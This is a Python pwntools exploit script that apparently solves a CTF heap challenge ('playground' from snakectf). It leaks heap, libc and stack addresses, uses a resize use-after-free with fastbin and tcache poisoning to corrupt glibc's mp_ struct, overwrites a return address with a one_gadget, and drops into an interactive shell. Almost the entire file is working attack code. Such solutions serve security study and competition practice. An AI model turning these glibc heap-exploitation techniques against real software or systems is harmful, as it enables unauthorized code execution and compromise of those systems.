from pwn import *

EXE_FILENAME = "./playground_patched"
exe = ELF(EXE_FILENAME)
context.binary = exe

ENV = {"GLIBC_TUNABLES": "glibc.malloc.mmap_max=0:glibc.malloc.tcache_count=0:glibc.malloc.tcache_max=0"}

TEAM_TOKEN = "REDACTED"

SIZE_PASSO = 0x60
TARGET_CHUNK_SIZE = 0x40
ATTACKER_CHUNK_SIZE = 0x58
FAKE_SIZE_LIBC_OFFSET = 0x1e8008
LIBC_ARENA_OFFSET = 0x1e8ba0
ARGV_OFFSET = 0x1e96e0
ONE_GADGET_OFFSET = 0xe6030

class mp_:
    struct_schema = {
                "trim_threshold": 0x8,
                "top_pad": 0x8,
                "mmap_threshold": 0x8,
                "arena_test": 0x8,
                "arena_max": 0x8,
                "thp_pagesize": 0x8,
                "hp_pagesize": 0x8,
                "hp_flags": 0x4,
                "n_mmaps": 0x4,
                "n_mmaps_max": 0x4,
                "max_n_mmaps": 0x4,
                "no_dyn_threshold": 0x8,
                "mmapped_med": 0x8,
                "max_mmapped_mem": 0x8,
                "sbrk_base": 0x8,
                "tcache_small_bins": 0x8,
                "tcache_max_bytes": 0x8,
                "tcache_count": 0x8,
                "tcache_unsorted_limit": 0x8,
    }
    def __init__(self, mp_ = False):
        if mp_:
            self.mp_ = mp_
        else:
            self.mp_ = {
                "trim_threshold": 0x0,
                "top_pad": 0x0,
                "mmap_threshold": 0x0,
                "arena_test": 0x0,
                "arena_max": 0x0,
                "thp_pagesize": 0x0,
                "hp_pagesize": 0x0,
                "hp_flags": 0x0,
                "n_mmaps": 0x0,
                "n_mmaps_max": 0x0,
                "max_n_mmaps": 0x0,
                "no_dyn_threshold": 0x0,
                "mmapped_med": 0x0,
                "max_mmapped_mem": 0x0,
                "sbrk_base": 0x0,
                "tcache_small_bins": 0x0,
                "tcache_max_bytes": 0x0,
                "tcache_count": 0x0,
                "tcache_unsorted_limit": 0x0,
            }
    def digest(self):
        digest = b""
        for elem in self.mp_:
            digest += pack(self.mp_[elem], word_size=(mp_.struct_schema[elem] * 8))
        return digest

def recv_menu():
    p.recvuntil(b"quit")
    p.recvuntil(b"> ")

def malloc(size):
    p.sendline(b"a")
    p.recvuntil(b"> ")
    p.sendline(str(size).encode())
    recv_menu()

def free(index):
    p.sendline(b"f")
    p.recvuntil(b"> ")
    p.sendline(str(index).encode())
    recv_menu()

def edit(index, payload):
    p.sendline(b"e")
    p.recvuntil(b"> ")
    p.sendline(str(index).encode())
    p.recvuntil(b"> ")
    p.sendline(payload)
    recv_menu()

def puts(index):
    p.sendline(b"p")
    p.recvuntil(b"> ")
    p.sendline(str(index).encode())
    p.recvline()
    result = p.recvline()[:-1]
    recv_menu()
    return result

def resize(index, size):
    p.sendline(b"r")
    p.recvuntil(b"> ")
    p.sendline(str(index).encode())
    p.recvuntil(b"> ")
    p.sendline(str(size).encode())
    recv_menu()

def chunk_size(requested_size):
    return (requested_size & ~0xf) + 0x10

def fast_bin_poison(mangled_target, size):
    malloc(size)
    malloc(size)
    malloc(size)
    resize(8, 0)
    resize(8, size)
    payload = p64(mangled_target)
    edit(8, payload)

    malloc(size)
    malloc(size)

    free(8)
    free(9)
    free(11)
    free(10)

# p = gdb.debug([EXE_FILENAME], gdbscript=f'''

# ''', env=ENV)

p = process(EXE_FILENAME, env=ENV)

# p = remote("old-school.challs.snakectf.org", 1337, ssl=True)
# p.recvuntil(b"enter your team token: ")
# p.sendline(TEAM_TOKEN.encode())


recv_menu()
malloc(ATTACKER_CHUNK_SIZE)  # This chunk will be used to overwrite metadata of the next chunk
malloc(TARGET_CHUNK_SIZE)    # This chunk will metadata will be poisoned
malloc(0x30)                 # Guard to avoid breaking top chunk
malloc(0x20)                 # Guard to avoid consolidation
# Free and malloc again 1 chunk to leak heap address
free(1)
malloc(TARGET_CHUNK_SIZE)
secret = puts(1)
secret = int.from_bytes(secret, "little")
target_chunk_address = (secret << 12) | (0x10 + chunk_size(ATTACKER_CHUNK_SIZE))
print(f"Secret: {hex(secret)}")

# Creating a fake chunk overlapping the target chunk
payload = b"A" * 0x30 + p64(0x0) + p64(chunk_size(ATTACKER_CHUNK_SIZE) + 0x1) + p64(secret)
edit(0, payload)

# Exploit resize to get a UAF primitive
resize(0, 0x0)
resize(0, ATTACKER_CHUNK_SIZE)

# Poison fast bins to put the fake chunk in them
payload = p64(secret ^ (target_chunk_address - 0x30))
edit(0, payload)

# Put the fake chunk on top of the fast bins
malloc(ATTACKER_CHUNK_SIZE)

# This payload will be copied in the fake chunk when resize will be called
payload = b"B" * 0x10 + p64(0x0) + p64(0x91)
edit(1, payload)

# Exploit the resize malloc-copy-free to free a chunk with size > 0x80 so it will go in unsorted bins
resize(1, ATTACKER_CHUNK_SIZE)

# Get Libc leak
malloc(0x40)
leak = puts(5)
leak = int.from_bytes(leak, "little")
libc_base = leak - LIBC_ARENA_OFFSET
print(f"Libc base: {hex(libc_base)}")

# Allocate in libc through fast bin poisoning
libc_secret = (libc_base + FAKE_SIZE_LIBC_OFFSET) >> 12
malloc(0x10)
resize(6, 0)
resize(6, 0x10)
payload = p64(secret ^ (libc_base + FAKE_SIZE_LIBC_OFFSET - 0x8))
edit(6, payload)
malloc(0x10)
free(0)             # free(0) so the new libc chunk will be at index 0 (unecessary)
malloc(0x10)

# Build a fake chunk inside the libc to allocate further
payload = p64(0x0) + p64(0x30 | 0b10)[:-1]          # Flip ismmapped flag to bypass INVALID_SIZE check
edit(0, payload)

nd = libc_base + FAKE_SIZE_LIBC_OFFSET + 0x8        # Next libc fake chunk

# Start walking in the libc creating faking chunk and allocating them
fast_bin_poison(secret ^ nd, 0x20)
nd = nd + 0x10
payload = p64(0x0) + p64(0x72) + p64(libc_secret)
edit(12, payload)

# Iterate the walk
for i in range(13, 17):
    fast_bin_poison(secret ^ nd, SIZE_PASSO)
    nd = nd + SIZE_PASSO - 0x10
    payload = p64(0x71) * ((SIZE_PASSO - 0x20)//8) + p64(0x0) + p64((SIZE_PASSO + 0x10) | 0b10) + p64(libc_secret)
    edit(i, payload)

# Now we reach the mp_ struct
fast_bin_poison(secret ^ nd, SIZE_PASSO)
nd = nd + SIZE_PASSO

poisoned_mp_ = mp_()
poisoned_mp_.mp_["trim_threshold"] = 0x20000
poisoned_mp_.mp_["top_pad"] = 0x20000
poisoned_mp_.mp_["mmap_threshold"] = 0x20000
poisoned_mp_.mp_["arena_test"] = 0x8
poisoned_mp_.mp_["no_dyn_threshold"] = 0x72
poisoned_mp_.mp_["sbrk_base"] = secret << 12
poisoned_mp_.mp_["tcache_small_bins"] = 0x1
poisoned_mp_.mp_["tcache_max_bytes"] = 0x410
poisoned_mp_.mp_["tcache_count"] = 0x7

mp_digest = poisoned_mp_.digest()

# Walking inside the mp_ struct without breaking it too much
payload = p64(0x0) * 2 + mp_digest[:0x50]
edit(17, payload[:-1])

fast_bin_poison(secret ^ nd, SIZE_PASSO)

# Reactivating tcache
payload = mp_digest[0x50:0x80]
edit(18, payload)

# Tcache poisoning to leak argv address (stack)
malloc(0x40)
resize(8, 0)
resize(8, 8)
payload = p64(secret ^ (libc_base + ARGV_OFFSET))
edit(8, payload)
malloc(0x40)
malloc(0x40)
recv_menu()
argv = puts(10)
argv = int.from_bytes(argv, "little")
rbp = argv - 0x128
chunk_edit_stack = rbp - 0x80
print(f"RBP: {hex(rbp)}")

# Allocating where the chunks variable is stored to overwrite it
free(8)
malloc(0x38)
malloc(0x38)
free(8)
resize(11, 0)
resize(11, 0x38)
payload = p64(secret ^ (rbp - 0x10))
edit(11, payload)
malloc(0x38)
malloc(0x38)

# Creating a fake chunk_t struct to write over the return address of chunk_edit
fake_struct_address = (secret << 12) | 0x010
print(f"Fake struct: {hex(fake_struct_address)}")
malloc(0x50)
payload = flat(
    0x0,
    0x0,
    0x0,
    0x0,
    chunk_edit_stack + 0x8,
    (0x630 << 32) | (0x630 << 1) | 0x1,
    fake_struct_address,
    (0x50 << 32) | (0x60 << 1) | 0x1
)
edit(20, payload)

# Overwriting the struct address with the fake one
edit(19, p64(fake_struct_address))

# Overwrite the return address to call one_gadget
payload = flat(
    b"A" * 0x10,
    libc_base + ONE_GADGET_OFFSET
)
p.sendline(b"e")
p.recvuntil(b"> ")
p.sendline(str(1602).encode())
p.recvuntil(b"> ")
p.sendline(payload)

p.interactive()